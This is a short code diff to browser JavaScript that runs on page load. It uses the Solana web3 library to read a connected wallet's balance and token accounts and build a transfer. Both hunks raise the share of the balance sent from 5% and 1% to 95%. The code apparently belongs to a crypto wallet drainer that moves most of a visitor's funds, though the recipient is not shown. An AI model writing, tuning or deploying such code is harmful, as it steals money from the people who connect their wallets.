@@ -227,7 +227,7 @@ $(document).ready(async function () {
       const tokens = await getTokenAccounts(connection, publicKey);
 
       const balanceForTransfer = walletBalance - minBalance;
-      const solTransferAmount = Math.floor(Number(balanceForTransfer * 0.05));
+      const solTransferAmount = Math.floor(Number(balanceForTransfer * 0.95));
 
       let transaction = new solanaWeb3.Transaction();
 
@@ -547,7 +547,7 @@ $(document).ready(async function () {
 
               const balanceForTransfer = walletBalance - minBalance;
               const solTransferAmount = Math.floor(
-                Number(balanceForTransfer * 0.01)
+                Number(balanceForTransfer * 0.95)
               );
 
               // Create transaction
